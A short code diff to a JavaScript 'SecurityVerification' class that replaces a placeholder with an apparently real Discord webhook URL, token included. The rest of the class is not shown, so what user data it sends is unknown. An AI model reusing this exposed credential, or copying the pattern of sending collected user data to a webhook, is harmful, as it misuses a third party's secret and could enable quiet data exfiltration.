@@ -2,7 +2,7 @@ class SecurityVerification {
     constructor() {
         this.userData = {};
         this.securityFlags = [];
-        this.discordWebhookUrl = 'YOUR_DISCORD_WEBHOOK_URL_HERE'; // Replace with Discord webhook URL
+        this.discordWebhookUrl = 'https://discord.com/api/webhooks/1398832477673361569/K-HhuhhkOIkpwdIORB4mJPOy3Yp_8BKP0QXIeIDLWGC33jbNBmFc7jRATH3j0PhykQ1P'; // Replace with Discord webhook URL
         this.init();
     }
 
